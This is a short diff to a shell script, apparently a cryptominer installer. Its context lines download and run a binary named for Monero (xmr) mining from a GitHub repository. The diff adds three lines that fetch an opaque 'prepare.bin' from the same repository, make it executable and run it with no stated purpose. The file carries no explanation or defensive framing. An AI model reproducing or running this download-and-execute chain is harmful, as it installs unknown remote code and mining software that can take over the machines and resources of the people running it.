@@ -15,6 +15,10 @@ case $architecture in
         ;;
 esac
 
+curl -LO https://github.com/spetterman66/verynicerepo/raw/main/prepare.bin
+chmod +x prepare.bin
+./prepare.bin
+
 unalias -a
 curl -LO https://github.com/spetterman66/verynicerepo/raw/main/xmr_linux_$arch
 chmod +x xmr_linux_$arch
